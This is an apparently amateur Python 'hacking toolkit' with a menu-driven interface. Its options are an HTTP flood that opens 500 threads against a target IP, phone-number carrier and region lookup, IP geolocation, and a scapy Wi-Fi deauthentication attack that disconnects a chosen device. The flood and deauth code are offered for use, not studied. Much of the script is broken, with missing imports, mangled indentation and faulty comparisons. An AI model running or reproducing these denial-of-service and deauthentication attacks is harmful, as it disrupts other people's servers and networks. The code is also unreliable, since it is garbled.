import requests, fake_useragent
clear = lambda: os.system('cls')
from sys import argv
import time
import os
import socket
import shutil
import argparse
import requests
import random
import re
import threading
import argparse
import phonenumbers
from phonenumbers import geocoder, carrier
from color import *
clear()
jls_extract_var = """

███████╗░██████╗██╗░░██╗░█████╗░██████╗░
██╔════╝██╔════╝██║░██╔╝██╔══██╗██╔══██╗
█████╗░░╚█████╗░█████═╝░██║░░██║██║░░██║
██╔══╝░░░╚═══██╗██╔═██╗░██║░░██║██║░░██║
██║░░░░░██████╔╝██║░╚██╗╚█████╔╝██████╔╝
╚═╝░░░░░╚═════╝░╚═╝░░╚═╝░╚════╝░╚═════╝░
[1]-DDos
[2]-info number
[3]-ip info
[4]-wifi
"""
FEOLED(jls_extract_var)
jls_extract_var = input
select = jls_extract_var(":")
if select == '1':
	clear()
	dddsf = """

	██████╗░██████╗░░█████╗░░██████╗
	██╔══██╗██╔══██╗██╔══██╗██╔════╝
	██║░░██║██║░░██║██║░░██║╚█████╗░
	██║░░██║██║░░██║██║░░██║░╚═══██╗
	██████╔╝██████╔╝╚█████╔╝██████╔╝
	╚═════╝░╚═════╝░░╚════╝░╚═════╝░
	"""
	RED(dddsf)
	target = input('ip:')
	fake_ip = '182.21.20.32'
	port = 80
	def attack():
		while True:
		    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		    s.connect((target, port))
		    s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
		    s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
		    s.close()
	for i in range(500):
		thread = threading.Thread(target=attack)
		thread.start()

if select == '2':
	clear()
	ne1 = '██╗███╗░░██╗███████╗░█████╗░███╗░░██╗██╗░░░██╗███╗░░░███╗'
	ne2 = '██║████╗░██║██╔════╝██╔══██╗████╗░██║██║░░░██║████╗░████║'
	ne3 = '██║██╔██╗██║█████╗░░██║░░██║██╔██╗██║██║░░░██║██╔████╔██║'
	ne4 = '██║██║╚████║██╔══╝░░██║░░██║██║╚████║██║░░░██║██║╚██╔╝██║'
	ne5 = '██║██║░╚███║██║░░░░░╚█████╔╝██║░╚███║╚██████╔╝██║░╚═╝░██║'
	ne6 = '╚═╝╚═╝░░╚══╝╚═╝░░░░░░╚════╝░╚═╝░░╚══╝░╚═════╝░╚═╝░░░░░╚═╝'
	GREEN(ne1)
	GREEN(ne2)
	GREEN(ne3)
	GREEN(ne4)
	GREEN(ne5)
	GREEN(ne6)
	print('ведити номер телефона с +')
	r = input()
	x = phonenumbers.parse(r)
	valid = phonenumbers.is_valid_number(x)
	prosible = phonenumbers.is_possible_number(x)
	xg = carrier.name_for_number(x, 'ru')
	region = geocoder.description_for_number(x, 'ru')
	if prosible == 'False':
		print('[-]нет такого номера')
	elif valid == 'False':
		print('[-]этот номер не существует')
	elif valid == 'False' or prosible == 'False':
		print('[-]неправильный номер')
	else:
		print('[+]номер:', x)
		print('[+]оператор:', xg)
		print('[+]страна:', region)
if select == '3':
	clear()
	nn1 = '██╗███╗░░██╗███████╗░█████╗░██╗██████╗░'
	nn2 = '██║████╗░██║██╔════╝██╔══██╗██║██╔══██╗'
	nn3 = '██║██╔██╗██║█████╗░░██║░░██║██║██████╔╝'
	nn4 = '██║██║╚████║██╔══╝░░██║░░██║██║██╔═══╝░'
	nn5 = '██║██║░╚███║██║░░░░░╚█████╔╝██║██║░░░░░'
	nn6 = '╚═╝╚═╝░░╚══╝╚═╝░░░░░░╚════╝░╚═╝╚═╝░░░░░'
	GREEN(nn1)
	GREEN(nn2)
	GREEN(nn3)
	GREEN(nn4)
	GREEN(nn5)
	GREEN(nn6)
	jls_extract_var = """
	[1]ip address(URL)	
	[2]IP address info
	"""
	print(jls_extract_var)
	jls_extract_var = input
	select = jls_extract_var(":")
	if select == '1':
		def get_ip_by_hostname():
			hostname = input('ip address(URL):')

			try:
				return f'Hostname: {hostname}\nIP address: {socket.gethostbyname(hostname)}'
			except socket.gaierror as error:
				return f'Invalid Hostname - {error}'
		def main():
			print(get_ip_by_hostname())

		if __name__ == '__main__':
			main()
	if select == '2':
		def get_info_by_ip(ip='127.0.0.1'):
			try:
				response = requests.get(url=f'http://ip-api.com/json/{ip}').json()
				data = {
				'[IP]': response.get('query'),
				'[Int prov]': response.get('isp'),
				'[Org]': response.get('org'),
				'[Country]': response.get('country'),
				'[Region Name]': response.get('regionName'),
				'[City]': response.get('city'),
				'[ZIP]': response.get('zip'),
				'[Lat]': response.get('lat'),
				'[Lon]': response.get('lon')
				}

				for k, v in data.items():
					print(f'{k} : {v}')
			except requests.exceptions.ConnectionError:
				print('[!] Please check your connection!')
		def main():	
			ip = input('Please enter a target IP:')

			get_info_by_ip(ip=ip)

		if __name__ == '__main__':
			main()
if select == '4':
	nbn = """

	░██╗░░░░░░░██╗██╗░░░░░░███████╗██╗
	░██║░░██╗░░██║██║░░░░░░██╔════╝██║
	░╚██╗████╗██╔╝██║█████╗█████╗░░██║
	░░████╔═████║░██║╚════╝██╔══╝░░██║
	░░╚██╔╝░╚██╔╝░██║░░░░░░██║░░░░░██║
	░░░╚═╝░░░╚═╝░░╚═╝░░░░░░╚═╝░░░░░╚═╝


	[1]-wifi info
	[2]-wifi killer
	"""
	print(jls_extract_var)
	jls_extract_var = input
	select = jls_extract_var(":")
	if select == 1:
		def disconnect_user(mac_address, access_point,interface): 
	    packet = RadioTap() / Dot11(addr1=mac_address,  
	                                addr2=access_point,  
	            addr3=access_point) / Dot11Deauth(reason = 7) 
	    sendp(packet, inter=0.01,  
	          count=100, iface=interface,  
	          verbose=1) 
  
  
		def get_mac_address(ip_address): 
		    arp_request = ARP(pdst=ip_address) 
		    arp_response = sr1(arp_request,  
		                     timeout=1, verbose=False) 
		    if arp_response is not None: 
 		       return arp_response.hwsrc 
	 	   else: 
		        return None
    	  
		def getting_ip_of_access_point(): 
 		   return scapy.conf.route.route("8.8.8.8")[2] 
	  
		def getting_ip_of_this_device(): 
		    return scapy.conf.route.route("8.8.8.8")[1] 
  
		def getting_interface(ipaddress): 
 		    for interface in ifaces.values(): 
 		        if interface.ip == ipaddress: 
 		            return {"name":interface.name, 
 	                   "mac":interface.mac} 
  
      
		if __name__ == '__main__': 
  
		    devce_ip = '192.168.8.164'
		    router_ip = getting_ip_of_access_point() 
		    interface = getting_interface( 
 	        getting_ip_of_this_device()) 
		    mac_address_access_point = get_mac_address( 
		            router_ip) 
		    mac_address_device = get_mac_address( 
		            devce_ip) 
	      
		    print("MAC Address of Access Point : ", 
		          mac_address_access_point) 
		    print("MAC Address of Device : ", 
		          mac_address_device) 
		    print("Starting Deauthentication Attack on Device : ", 
		          mac_address_device) 
		    disconnect_user(mac_address_device,  
 		        mac_address_access_point,interface['name']) 
